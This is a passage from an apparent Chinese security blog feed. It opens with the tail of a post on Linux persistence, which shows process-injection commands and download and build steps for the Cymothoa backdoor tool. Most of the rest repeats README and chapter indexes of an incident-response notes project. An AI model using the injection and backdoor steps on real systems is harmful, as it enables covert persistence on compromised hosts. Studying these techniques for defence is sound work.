测试进程</span></span><br><span class="line">./sample-target</span><br><span class="line"><span class="comment"># 进程注入</span></span><br><span class="line">./inject -n sample-target sample-library.so</span><br></pre></td></tr></table></figure><p>验证进程注入成功，如下图所示：</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-2-8.png" alt=""></p><p>Cymothoa是一款隐秘的后门工具。它通过向目标主机活跃的进程注入恶意代码，从而获取和原进程相同的权限。该工具最大的优点就是不创建新的进程，不容易被发现。</p><p>下载地址：<a href="https://sourceforge.net/projects/cymothoa/files/cymothoa-1-beta/">https://sourceforge.net/projects/cymothoa/files/cymothoa-1-beta/</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载解压</span></span><br><span class="line"><span class="attribute">wget</span> https://jaist.dl.sourceforge.net/project/cymothoa/cymothoa-<span class="number">1</span>-beta/cymothoa-<span class="number">1</span>-beta.tar.gz</span><br><span class="line"><span class="attribute">tar</span> zxvf cymothoa-<span class="number">1</span>-beta.tar.gz </span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="attribute">cd</span> cymothoa-<span class="number">1</span>-beta &amp;&amp; make</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="0x07-结语">0x07 结语</h3><p>本文主要介绍了Linux下的几种隐藏技术，包括隐藏文件、隐藏权限、隐藏历史操作命令、端口复用、进程隐藏等方面的技巧。仅作抛砖引玉之用，欢迎留言分享。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;0x00-前言&quot;&gt;0x00 前言&lt;/h3&gt;
&lt;p&gt;攻击者在获取服务器权限后，会通过一些技巧来隐藏自己的踪迹和后门文件，本文介绍Linux下的几种隐藏技术。&lt;/p&gt;
&lt;h3 id=&quot;0x01-隐藏文件&quot;&gt;0x01 隐藏文件&lt;/h3&gt;
&lt;p&gt;Linux 下创建一个隐藏</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Emergency-Response-NotesREADME</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/c50485dc.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/c50485dc.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T05:34:25.949Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://bypass007.github.io/Emergency-Response-Notes/Summary/image/sum-title.png" alt=""></p><p>GitHub  地址：<a href="https://github.com/Bypass007/Emergency-Response-Notes">https://github.com/Bypass007/Emergency-Response-Notes</a></p><p>GitBook 地址：<a href="https://bypass007.github.io/Emergency-Response-Notes/">https://bypass007.github.io/Emergency-Response-Notes/</a></p><h3 id="项目介绍">项目介绍</h3><p>面对各种各样的安全事件，我们该怎么处理？</p><p>这是一个关于安全事件应急响应的项目，从系统入侵到事件处理，收集和整理了一些案例进行分析。</p><p>我将持续更新这份笔记，希望能帮到有需要的人。</p><p>如果你看到好的案例，欢迎通过issue提交。</p><h3 id="项目目录">项目目录</h3><ul><li><p><strong>[第一章：入侵排查篇]</strong></p><ul><li><p>第1篇：Window入侵排查</p></li><li><p>第2篇：Linux入侵排查</p></li><li><p>第3篇：常见的Webshell查杀工具</p></li><li><p>第4篇：如何发现隐藏的Webshell后门</p></li><li><p>第5篇：勒索病毒自救指南</p></li></ul></li><li><p><strong>[第二章：日志分析篇]</strong></p><ul><li><p>第1篇:Window日志分析</p></li><li><p>第2篇:Linux日志分析</p></li><li><p>第3篇:Web日志分析</p></li><li><p>第4篇:MSSQL日志分析</p></li><li><p>第5篇:MySQL日志分析</p></li></ul></li><li><p><strong>[第三章：权限维持篇]</strong></p><ul><li><p>第1篇：Windows权限维持–隐藏篇</p></li><li><p>第2篇：Windows权限维持–后门篇</p></li><li><p>第3篇：Linux权限维持–隐藏篇</p></li><li><p>第4篇：Linux权限维持–后门篇</p></li><li><p>第5篇：Windows命令行文件下载方式汇总</p></li><li><p>第6篇：三大渗透测试框架权限维持技术</p></li><li><p>第7篇：常见WebShell管理工具</p></li></ul></li><li><p><strong>[第四章:Windows实战篇]</strong></p><ul><li><p>第1篇：FTP暴力破解</p></li><li><p>第2篇：蠕虫病毒</p></li><li><p>第3篇：勒索病毒</p></li><li><p>第4篇：ARP病毒</p></li><li><p>第5篇：挖矿病毒（一）</p></li><li><p>第6篇：挖矿病毒（二）</p></li></ul></li><li><p><strong>[第五章：Linux实战篇]</strong></p><ul><li><p>第1篇：SSH暴力破解</p></li><li><p>第2篇：捕捉短连接</p></li><li><p>第3篇：挖矿病毒</p></li><li><p>第4篇：盖茨木马</p></li><li><p>第5篇：DDOS病毒</p></li><li><p>第6篇：Shell病毒</p></li></ul></li><li><p><strong>[第六章：Web实战篇]</strong></p><ul><li><p>第1篇：网站被植入Webshell</p></li><li><p>第2篇：门罗币恶意挖矿</p></li><li><p>第3篇：批量挂黑页</p></li><li><p>第4篇：新闻源网站劫持</p></li><li><p>第5篇：移动端劫持</p></li><li><p>第6篇：搜索引擎劫持</p></li><li><p>第7篇：网站首页被篡改</p></li><li><p>第8篇：管理员账号被篡改</p></li><li><p>第9篇：编辑器入侵事件</p></li></ul></li></ul><hr><h3 id="学习交流">学习交流</h3><p>后续持续更新内容，将发布在公众号Bypass–，同时公众号提供了该项目的PDF版本，关注后回复&quot;应急响应&quot; 即可下载。</p><p><img src="https://bypass007.github.io/Emergency-Response-Notes/Summary/image/sum-erweima.jpg" alt=""></p>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>Emergency-Response-NotesREADME</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/c50485dc.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/c50485dc.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T05:34:25.952Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://bypass007.github.io/Emergency-Response-Notes/Summary/image/sum-title.png" alt=""></p><p>GitHub  地址：<a href="https://github.com/Bypass007/Emergency-Response-Notes">https://github.com/Bypass007/Emergency-Response-Notes</a></p><p>GitBook 地址：<a href="https://bypass007.github.io/Emergency-Response-Notes/">https://bypass007.github.io/Emergency-Response-Notes/</a></p><h3 id="项目介绍">项目介绍</h3><p>面对各种各样的安全事件，我们该怎么处理？</p><p>这是一个关于安全事件应急响应的项目，从系统入侵到事件处理，收集和整理了一些案例进行分析。</p><p>我将持续更新这份笔记，希望能帮到有需要的人。</p><p>如果你看到好的案例，欢迎通过issue提交。</p><h3 id="项目目录">项目目录</h3><ul><li><p><strong>[第一章：入侵排查篇]</strong></p><ul><li><p>第1篇：Window入侵排查</p></li><li><p>第2篇：Linux入侵排查</p></li><li><p>第3篇：常见的Webshell查杀工具</p></li><li><p>第4篇：如何发现隐藏的Webshell后门</p></li><li><p>第5篇：勒索病毒自救指南</p></li></ul></li><li><p><strong>[第二章：日志分析篇]</strong></p><ul><li><p>第1篇:Window日志分析</p></li><li><p>第2篇:Linux日志分析</p></li><li><p>第3篇:Web日志分析</p></li><li><p>第4篇:MSSQL日志分析</p></li><li><p>第5篇:MySQL日志分析</p></li></ul></li><li><p><strong>[第三章：权限维持篇]</strong></p><ul><li><p>第1篇：Windows权限维持–隐藏篇</p></li><li><p>第2篇：Windows权限维持–后门篇</p></li><li><p>第3篇：Linux权限维持–隐藏篇</p></li><li><p>第4篇：Linux权限维持–后门篇</p></li><li><p>第5篇：Windows命令行文件下载方式汇总</p></li><li><p>第6篇：三大渗透测试框架权限维持技术</p></li><li><p>第7篇：常见WebShell管理工具</p></li></ul></li><li><p><strong>[第四章:Windows实战篇]</strong></p><ul><li><p>第1篇：FTP暴力破解</p></li><li><p>第2篇：蠕虫病毒</p></li><li><p>第3篇：勒索病毒</p></li><li><p>第4篇：ARP病毒</p></li><li><p>第5篇：挖矿病毒（一）</p></li><li><p>第6篇：挖矿病毒（二）</p></li></ul></li><li><p><strong>[第五章：Linux实战篇]</strong></p><ul><li><p>第1篇：SSH暴力破解</p></li><li><p>第2篇：捕捉短连接</p></li><li><p>第3篇：挖矿病毒</p></li><li><p>第4篇：盖茨木马</p></li><li><p>第5篇：DDOS病毒</p></li><li><p>第6篇：Shell病毒</p></li></ul></li><li><p><strong>[第六章：Web实战篇]</strong></p><ul><li><p>第1篇：网站被植入Webshell</p></li><li><p>第2篇：门罗币恶意挖矿</p></li><li><p>第3篇：批量挂黑页</p></li><li><p>第4篇：新闻源网站劫持</p></li><li><p>第5篇：移动端劫持</p></li><li><p>第6篇：搜索引擎劫持</p></li><li><p>第7篇：网站首页被篡改</p></li><li><p>第8篇：管理员账号被篡改</p></li><li><p>第9篇：编辑器入侵事件</p></li></ul></li></ul><hr><h3 id="学习交流">学习交流</h3><p>后续持续更新内容，将发布在公众号Bypass–，同时公众号提供了该项目的PDF版本，关注后回复&quot;应急响应&quot; 即可下载。</p><p><img src="https://bypass007.github.io/Emergency-Response-Notes/Summary/image/sum-erweima.jpg" alt=""></p>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第05章：Linux实战篇README</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/a8cea174.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/a8cea174.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T05:26:24.695Z</updated>
    
    <content type="html"><![CDATA[<h1>第05章：Linux实战篇</h1><p><a href="%E7%AC%AC1%E7%AF%87%EF%BC%9ASSH%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3.md">第1篇：SSH暴力破解</a></p><p><a href="%E7%AC%AC2%E7%AF%87%EF%BC%9A%E6%8D%95%E6%8D%89%E7%9F%AD%E8%BF%9E%E6%8E%A5.md">第2篇：捕捉短连接</a></p><p><a href="%E7%AC%AC3%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92.md">第3篇：挖矿病毒</a></p><p><a href="%E7%AC%AC4%E7%AF%87%EF%BC%9A%E7%9B%96%E8%8C%A8%E6%9C%A8%E9%A9%AC.md">第4篇：盖茨木马</a></p><p><a href="%E7%AC%AC5%E7%AF%87%EF%BC%9ADDOS%E7%97%85%E6%AF%92.md">第5篇：DDOS病毒</a></p>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第06章：Web实战篇README</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/c5604691.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/c5604691.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T05:26:24.703Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第06章：Web实战篇">第06章：Web实战篇</h2><p><a href="%E7%AC%AC1%E7%AF%87%EF%BC%9A%E7%BD%91%E7%AB%99%E8%A2%AB%E6%A4%8D%E5%85%A5Webshell.md">第1篇：网站被植入Webshell</a></p><p><a href="%E7%AC%AC2%E7%AF%87%EF%BC%9A%E9%97%A8%E7%BD%97%E5%B8%81%E6%81%B6%E6%84%8F%E6%8C%96%E7%9F%BF.md">第2篇：门罗币恶意挖矿</a></p><p><a href="%E7%AC%AC3%E7%AF%87%EF%BC%9A%E6%89%B9%E9%87%8F%E6%8C%82%E9%BB%91%E9%A1%B5.md">第3篇：批量挂黑页</a></p><p><a href="%E7%AC%AC4%E7%AF%87%EF%BC%9A%E6%96%B0%E9%97%BB%E6%BA%90%E7%BD%91%E7%AB%99%E5%8A%AB%E6%8C%81.md">第4篇：新闻源网站劫持</a></p><p><a href="%E7%AC%AC5%E7%AF%87%EF%BC%9A%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%8A%AB%E6%8C%81.md">第5篇：移动端劫持</a></p><p><a href="%E7%AC%AC6%E7%AF%87%EF%BC%9A%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%8A%AB%E6%8C%81.md">第6篇：搜索引擎劫持</a></p><p><a href="%E7%AC%AC7%E7%AF%87%EF%BC%9A%E7%BD%91%E7%AB%99%E9%A6%96%E9%A1%B5%E8%A2%AB%E7%AF%A1%E6%94%B9.md">第7篇：网站首页被篡改</a></p><p><a href="%E7%AC%AC8%E7%AF%87%EF%BC%9A%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E8%A2%AB%E7%AF%A1%E6%94%B9.md">第8篇：管理员账号被篡改</a></p>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第07章：恶意样本库README</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/9e42d417.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/9e42d417.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T05:26:24.718Z</updated>
    
    <content type="html"><![CDATA[<h1>第07章：恶意样本库</h1><p>收集一些有意思的恶意样本，包括免杀的webshell、后门病毒、rookit等。</p><p>已收集免杀的Webshell样本数量：200+，已收集的病毒样本：蠕虫、木马、挖矿、勒索等。</p><p>慢慢积累吧，可以用来搭建应急靶机、验证安全引擎查杀能力等，这应该会挺有意思的。</p><p>-----------因内容相关敏感，取消样本内容分享。</p>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第02章：日志分析篇README</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/282bd95d.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/282bd95d.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T05:34:25.954Z</updated>
    
    <content type="html"><![CDATA[<h1>第02章：日志分析</h1><p><a href="%E7%AC%AC1%E7%AF%87%EF%BC%9AWindow%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90.md">第1篇:Window日志分析</a></p><p><a href="%E7%AC%AC2%E7%AF%87%EF%BC%9ALinux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90.md">第2篇:Linux日志分析</a></p><p><a href="%E7%AC%AC3%E7%AF%87%EF%BC%9AWeb%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90.md">第3篇:Web日志分析</a></p><p><a href="%E7%AC%AC4%E7%AF%87%EF%BC%9AMSSQL%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90.md">第4篇:MSSQL日志分析</a></p><p><a href="%E7%AC%AC5%E7%AF%87%EF%BC%9AMySQL%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90.md">第5篇:MySQL日志分析</a></p>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第04章：Windows实战篇README</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/e7b8862a.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/e7b8862a.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T05:34:25.955Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第04章-Windows实战篇">第04章: Windows实战篇</h2><p><a href="%E7%AC%AC1%E7%AF%87%EF%BC%9AFTP%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3.md">第1篇：FTP暴力破解</a></p><p><a href="%E7%AC%AC2%E7%AF%87%EF%BC%9A%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92.md">第2篇：蠕虫病毒</a></p><p><a href="%E7%AC%AC3%E7%AF%87%EF%BC%9A%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92.md">第3篇：勒索病毒</a></p><p><a href="%E7%AC%AC4%E7%AF%87%EF%BC%9AARP%E7%97%85%E6%AF%92.md">第4篇：ARP病毒</a></p><p><a href="%E7%AC%AC5%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%EF%BC%88%E4%B8%80%EF%BC%89.md">第5篇：挖矿病毒（一）</a></p><p><a href="%E7%AC%AC6%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%EF%BC%88%E4%BA%8C%EF%BC%89.md">第6篇：挖矿病毒（二）</a></p>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第05章：Linux实战篇README</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/a8cea174.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/a8cea174.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T05:34:25.957Z</updated>
    
    <content type="html"><![CDATA[<h1>第05章：Linux实战篇</h1><p><a href="%E7%AC%AC1%E7%AF%87%EF%BC%9ASSH%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3.md">第1篇：SSH暴力破解</a></p><p><a href="%E7%AC%AC2%E7%AF%87%EF%BC%9A%E6%8D%95%E6%8D%89%E7%9F%AD%E8%BF%9E%E6%8E%A5.md">第2篇：捕捉短连接</a></p><p><a href="%E7%AC%AC3%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92.md">第3篇：挖矿病毒</a></p><p><a href="%E7%AC%AC4%E7%AF%87%EF%BC%9A%E7%9B%96%E8%8C%A8%E6%9C%A8%E9%A9%AC.md">第4篇：盖茨木马</a></p><p><a href="%E7%AC%AC5%E7%AF%87%EF%BC%9ADDOS%E7%97%85%E6%AF%92.md">第5篇：DDOS病毒</a></p>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第06章：Web实战篇README</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/c5604691.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/c5604691.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T05:34:25.958Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第06章：Web实战篇">第06章：Web实战篇</h2><p><a href="%E7%AC%AC1%E7%AF%87%EF%BC%9A%E7%BD%91%E7%AB%99%E8%A2%AB%E6%A4%8D%E5%85%A5Webshell.md">第1篇：网站被植入Webshell</a></p><p><a href="%E7%AC%AC2%E7%AF%87%EF%BC%9A%E9%97%A8%E7%BD%97%E5%B8%81%E6%81%B6%E6%84%8F%E6%8C%96%E7%9F%BF.md">第2篇：门罗币恶意挖矿</a></p><p><a href="%E7%AC%AC3%E7%AF%87%EF%BC%9A%E6%89%B9%E9%87%8F%E6%8C%82%E9%BB%91%E9%A1%B5.md">第3篇：批量挂黑页</a></p><p><a href="%E7%AC%AC4%E7%AF%87%EF%BC%9A%E6%96%B0%E9%97%BB%E6%BA%90%E7%BD%91%E7%AB%99%E5%8A%AB%E6%8C%81.md">第4篇：新闻源网站劫持</a></p><p><a href="%E7%AC%AC5%E7%AF%87%EF%BC%9A%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%8A%AB%E6%8C%81.md">第5篇：移动端劫持</a></p><p><a href="%E7%AC%AC6%E7%AF%87%EF%BC%9A%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%8A%AB%E6%8C%81.md">第6篇：搜索引擎劫持</a></p><p><a href="%E7%AC%AC7%E7%AF%87%EF%BC%9A%E7%BD%91%E7%AB%99%E9%A6%96%E9%A1%B5%E8%A2%AB%E7%AF%A1%E6%94%B9.md">第7篇：网站首页被篡改</a></p><p><a href="%E7%AC%AC8%E7%AF%87%EF%BC%9A%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E8%A2%AB%E7%AF%A1%E6%94%B9.md">第8篇：管理员账号被篡改</a></p>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第07章：恶意样本库README</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/9e42d417.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/9e42d417.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T05:34:25.960Z</updated>
    
    <content type="html"><![CDATA[<h1>第07章：恶意样本库</h1><p>收集一些有意思的恶意样本，包括免杀的webshell、后门病毒、rookit等。</p><p>已收集免杀的Webshell样本数量：200+，已收集的病毒样本：蠕虫、木马、挖矿、勒索等。</p><p>慢慢积累吧，可以用来搭建应急靶机、验证安全引擎查杀能力等，这应该会挺有意思的。</p><p>-----------因内容相关敏感，取消样本内容分享。</p>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>Emergency-Response-NotesREADME</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/c50485dc.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/c50485dc.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T05:26:24.645Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://bypass007.github.io/Emergency-Response-Notes/Summary/image/sum-title.png" alt=""></p><p>GitHub  地址：<a href="https://github.com/Bypass007/Emergency-Response-Notes">https://github.com/Bypass007/Emergency-Response-Notes</a></p><p>GitBook 地址：<a href="https://bypass007.github.io/Emergency-Response-Notes/">https://bypass007.github.io/Emergency-Response-Notes/</a></p><h3 id="项目介绍">项目介绍</h3><p>面对各种各样的安全事件，我们该怎么处理？</p><p>这是一个关于安全事件应急响应的项目，从系统入侵到事件处理，收集和整理了一些案例进行分析。</p><p>我将持续更新这份笔记，希望能帮到有需要的人。</p><p>如果你看到好的案例，欢迎通过issue提交。</p><h3 id="项目目录">项目目录</h3><ul><li><p><strong>[第一章：入侵排查篇]</strong></p><ul><li><p>第1篇：Window入侵排查</p></li><li><p>第2篇：Linux入侵排查</p></li><li><p>第3篇：常见的Webshell查杀工具</p></li><li><p>第4篇：如何发现隐藏的Webshell后门</p></li><li><p>第5篇：勒索病毒自救指南</p></li></ul></li><li><p><strong>[第二章：日志分析篇]</strong></p><ul><li><p>第1篇:Window日志分析</p></li><li><p>第2篇:Linux日志分析</p></li><li><p>第3篇:Web日志分析</p></li><li><p>第4篇:MSSQL日志分析</p></li><li><p>第5篇:MySQL日志分析</p></li></ul></li><li><p><strong>[第三章：权限维持篇]</strong></p><ul><li><p>第1篇：Windows权限维持–隐藏篇</p></li><li><p>第2篇：Windows权限维持–后门篇</p></li><li><p>第3篇：Linux权限维持–隐藏篇</p></li><li><p>第4篇：Linux权限维持–后门篇</p></li><li><p>第5篇：Windows命令行文件下载方式汇总</p></li><li><p>第6篇：三大渗透测试框架权限维持技术</p></li><li><p>第7篇：常见WebShell管理工具</p></li></ul></li><li><p><strong>[第四章:Windows实战篇]</strong></p><ul><li><p>第1篇：FTP暴力破解</p></li><li><p>第2篇：蠕虫病毒</p></li><li><p>第3篇：勒索病毒</p></li><li><p>第4篇：ARP病毒</p></li><li><p>第5篇：挖矿病毒（一）</p></li><li><p>第6篇：挖矿病毒（二）</p></li></ul></li><li><p><strong>[第五章：Linux实战篇]</strong></p><ul><li><p>第1篇：SSH暴力破解</p></li><li><p>第2篇：捕捉短连接</p></li><li><p>第3篇：挖矿病毒</p></li><li><p>第4篇：盖茨木马</p></li><li><p>第5篇：DDOS病毒</p></li><li><p>第6篇：Shell病毒</p></li></ul></li><li><p><strong>[第六章：Web实战篇]</strong></p><ul><li><p>第1篇：网站被植入Webshell</p></li><li><p>第2篇：门罗币恶意挖矿</p></li><li><p>第3篇：批量挂黑页</p></li><li><p>第4篇：新闻源网站劫持</p></li><li><p>第5篇：移动端劫持</p></li><li><p>第6篇：搜索引擎劫持</p></li><li><p>第7篇：网站首页被篡改</p></li><li><p>第8篇：管理员账号被篡改</p></li><li><p>第9篇：编辑器入侵事件</p></li></ul></li></ul><hr><h3 id="学习交流">学习交流</h3><p>后续持续更新内容，将发布在公众号Bypass–，同时公众号提供了该项目的PDF版本，关注后回复&quot;应急响应&quot; 即可下载。</p><p><img src="https://bypass007.github.io/Emergency-Response-Notes/Summary/image/sum-erweima.jpg" alt=""></p>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第02章：日志分析篇README</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/282bd95d.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/282bd95d.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T05:26:24.664Z</updated>
    
    <content type="html"><![CDATA[<h1>第02章：日志分析</h1><p><a href="%E7%AC%AC1%E7%AF%87%EF%BC%9AWindow%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90.md">第1篇:Window日志分析</a></p><p><a href="%E7%AC%AC2%E7%AF%87%EF%BC%9ALinux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90.md">第2篇:Linux日志分析</a></p><p><a href="%E7%AC%AC3%E7%AF%87%EF%BC%9AWeb%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90.md">第3篇:Web日志分析</a></p><p><a href="%E7%AC%AC4%E7%AF%87%EF%BC%9AMSSQL%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90.md">第4篇:MSSQL日志分析</a></p><p><a href="%E7%AC%AC5%E7%AF%87%EF%BC%9AMySQL%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90.md">第5篇:MySQL日志分析</a></p>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第04章：Windows实战篇README</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/e7b8862a.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/e7b8862a.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T05:26:24.685Z</updated>
    
